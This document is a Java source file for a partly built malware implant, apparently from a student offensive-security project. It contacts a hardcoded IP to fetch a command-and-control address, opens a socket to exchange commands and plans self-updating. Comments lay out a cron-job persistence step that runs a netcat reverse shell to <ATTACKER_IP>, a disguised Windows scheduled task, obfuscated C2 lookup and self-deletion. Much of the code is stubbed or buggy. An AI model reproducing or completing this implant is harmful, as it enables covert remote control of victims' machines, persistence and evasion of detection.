import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringWriter;

public class implant {

    static String GetC2IP() {
        String res;
        try {
            URL url = new URL("http://54.221.167.111/api/download");
            String FakeOutProf = "MWAHAHAHAHHA YOU FOOOL";

            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", Integer.toString(FakeOutProf.length()));

            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.writeBytes(FakeOutProf);
            }

            try (BufferedReader bf = new BufferedReader(new InputStreamReader(
                    conn.getInputStream()))) {
                res = bf.readLine();
            }

        } catch (Exception e) {
            // TODO handle exception better
            System.out.println("someting bad getting c2 ip");
            System.out.println(e);
            res = "toodaloo";
        }
        return res;
    }

    static Socket MakeServerConn(String IP, int Port) {
        Socket sock = null;
        try {
            sock = new Socket(IP, Port);
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad making port");
            System.out.println(e);
        }
        return sock;
    }

    static int SendMsgToServer(String Message, Socket sock) {
        // TODO: Encrypt all traffic sent
        try {
            OutputStream dout = sock.getOutputStream();
            byte[] msgInBytes = Message.getBytes("UTF-8");
            dout.write(msgInBytes);
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad sending");
            System.out.println(e);

        }
        return 0;
    }

    static String RecvMsgFromServer(Socket sock) {
        // TODO: decrypt encrypted traffic
        String decodedReply = "";
        try {
            InputStream din = sock.getInputStream();
            byte[] reply = new byte[100];
            int replyLen = din.read(reply);
            decodedReply = new String(reply, StandardCharsets.UTF_8);
        } catch (Exception e) {
            // TODO: handle exception
            System.out.println("someting bad receiving");
            System.out.println(e);
        }

        return decodedReply;
    }

    static void SelfDestruct() {
        /*------------------------Self Destruct PSEUDOCODE------------------------------*/

        /*
         * if (ipNotRetrievableForTwoWeeks == True){
         * try {
         * Files.deleteIfExists(
         * Paths.get("/home/secret/implant.class"));
         * }
         * catch (NoSuchFileException e) {
         * System.out.println(
         * "No such file/directory exists");
         * }
         * catch (DirectoryNotEmptyException e) {
         * System.out.println("Directory is not empty.");
         * }
         * catch (IOException e) {
         * System.out.println("Invalid permissions.");
         * }
         * 
         * System.out.println("Deletion successful.");
         * }
         */
    }

    static String GetArchitecture() {
        return System.getProperty("os.name").toLowerCase();
    }

    static void POCPersistenceLinux() {
        // TODO: check for persistence before establishing
        // this stuff below is a proof of concept for running bash commands in java,
        // eventually it will implement our persistence mechanism
        String s;
        Process p;
        try {
            p = Runtime.getRuntime().exec("ls -AL");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
                System.out.println("line: " + s);
            p.waitFor();
            System.out.println("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) {
        }
        // end of bash proof of concept
    }

    static void POCPersistenceWindows() {
        // TODO: check for persistence before establishing
        // TODO: establish persistence
    }

    static void EstablishPersistence() {
        /*
         * Another persistence mechanism for linux using a CRON JOB:
         * Periodically sends reverse shell to host machine as often as needed,
         * Note: requires netcat-traditional to be installed on victims machine.
         * CT=$(crontab -l)
         * CT=$CT$'\n10 * * * * nc -e /bin/bash <ATTACKER_IP> <PORT>'
         * printf "$CT" | crontab -
         */
    }

    static void HandleServerCommand(String command) {
        if (command == "sc") {

        }
    }

    public static void main(String[] args) {

        // START CODE FOR MAIN HERE

        // hash currently running implant
        String currHash = "123";

        // check system architecture and run accordingly. .bashrc vs windowsStartup,
        String os = GetArchitecture();
        if (os.matches("linux")) {

        } else if (os.matches("windows")) {

        }

        // Check for persistence
        // setup persistence if not established

        // retrieve IP for c2 from
        // XORwCustomString(base64(freeram.net/superlongendpointstringthatreturnsWhateverIPweCurrentlyAreusing))

        // if IP hasnt been retrievable for x days, self destruct

        // schtasks.exe /create /tn not-an-implant /sc daily /st 10:00 /tr java
        // implant.class

        String c2IP = GetC2IP();

        Socket c2Sock = MakeServerConn("0.0.0.0", 5000);

        String reply;

        // send hash of running implant
        SendMsgToServer("hash blahblah", c2Sock);

        // receive hash of most updated implant from server
        reply = RecvMsgFromServer(c2Sock);
        System.out.println(reply);
        if (reply != currHash) {
            // TODO: download most recent implant from server
            // run that implant, delete current implant
        }

        // send message asking what to do
        SendMsgToServer("what", c2Sock);
        // receive answer
        reply = RecvMsgFromServer(c2Sock);
        HandleServerCommand(reply);
    }

}